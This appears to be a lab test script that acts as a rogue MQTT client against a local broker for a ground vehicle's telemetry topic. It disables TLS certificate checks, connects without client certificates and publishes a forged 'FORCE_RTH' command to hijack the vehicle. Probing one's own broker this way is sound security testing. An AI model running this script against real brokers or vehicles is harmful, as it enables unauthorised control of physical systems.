import paho.mqtt.client as mqtt
import ssl
import json
import time 

BROKER_HOST ="localhost"
BROKER_PORT = 8883
TOPIC = "argus/telemetry/ugv-alpha"

def on_connect(client, userdata, flags, rc):
    print(f" connection attempt result: {rc}")

def on_disconnect(client, userdata, rc):
    print(f" disconnected with result code: {rc}")
    
    
#spinning up a fake client 
attacker_client = mqtt.Client(client_id="rogue-node-01")
attacker_client.on_connect = on_connect
attacker_client.on_disconnect = on_disconnect

#attacker attempts to use standard SSL/TLS (no mTLS certificates) hoping the broker is misconfigured and accepts a basic encrypted tunnel

context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
attacker_client.tls_set_context(context)

print("[!] Initiating C@ Hijacking Attempt...")
try: 
    attacker_client.connect(BROKER_HOST, BROKER_PORT, 60   )
    attacker_client.loop_start()
    
    #attempt to inject malicoius payload 
    malicious_payload = { 
                         "ugv_id": "ugv-alpha",
                         "timestamp": time.time(),
                         "command": "FORCE_RTH", #force return to home 
                         "override_code": "0xDEADBEEF" #some arbitrary override code
                        }
    
    print("[!] Publishing Malicious Payload to Topic...")
    attacker_client.publish(TOPIC, json.dumps(malicious_payload))
    time.sleep(2) #wait for a bit to ensure message is sent
    
    
except Exception as e:
    print(f"[-] Exploit failed: {e}")
    
finally:
    attacker_client.loop_stop()
    attacker_client.disconnect()
    print("[!] Exploit attempt completed.") 